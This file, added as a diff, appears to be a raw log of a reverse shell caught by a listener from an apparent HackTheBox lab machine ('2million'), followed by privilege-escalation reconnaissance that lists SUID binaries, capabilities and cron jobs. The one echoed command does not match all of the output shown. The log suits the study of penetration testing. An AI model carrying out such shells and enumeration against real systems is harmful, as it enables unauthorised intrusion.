@@ -1,0 +1,85 @@
+Listening on 0.0.0.0 9006
+Connection received on 10.129.148.45 53592
+bash: cannot set terminal process group (1092): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$ </etc/crontab 2>/dev/null | grep -v "^#"; echo MARKP
+/snap/snapd/19122/usr/lib/snapd/snap-confine
+/snap/core20/1891/usr/bin/chfn
+/snap/core20/1891/usr/bin/chsh
+/snap/core20/1891/usr/bin/gpasswd
+/snap/core20/1891/usr/bin/mount
+/snap/core20/1891/usr/bin/newgrp
+/snap/core20/1891/usr/bin/passwd
+/snap/core20/1891/usr/bin/su
+/snap/core20/1891/usr/bin/sudo
+/snap/core20/1891/usr/bin/umount
+/snap/core20/1891/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1891/usr/lib/openssh/ssh-keysign
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/fusermount3
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chfn
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+===CAPS===
+/snap/core20/1891/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+===CRON===
+-rw-r--r-- 1 root root 1136 Mar 23  2022 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x   2 root root 4096 Jun  6  2023 .
+drwxr-xr-x 101 root root 4096 Jun  6  2023 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
+-rw-r--r--   1 root root  712 Jan 28  2022 php
+
+/etc/cron.daily:
+total 32
+drwxr-xr-x   2 root root 4096 Jun  6  2023 .
+drwxr-xr-x 101 root root 4096 Jun  6  2023 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
+-rwxr-xr-x   1 root root 1478 Apr  8  2022 apt-compat
+-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg
+-rwxr-xr-x   1 root root  377 May 25  2022 logrotate
+-rwxr-xr-x   1 root root 1330 Mar 17  2022 man-db
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x   2 root root 4096 Jun  6  2023 .
+drwxr-xr-x 101 root root 4096 Jun  6  2023 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x   2 root root 4096 Jun  6  2023 .
+drwxr-xr-x 101 root root 4096 Jun  6  2023 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+
+/etc/cron.weekly:
+total 16
+drwxr-xr-x   2 root root 4096 Jun  6  2023 .
+drwxr-xr-x 101 root root 4096 Jun  6  2023 ..
+-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
+-rwxr-xr-x   1 root root 1020 Mar 17  2022 man-db
+
+SHELL=/bin/sh
+
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+MARKP
+www-data@2million:~/html$ 
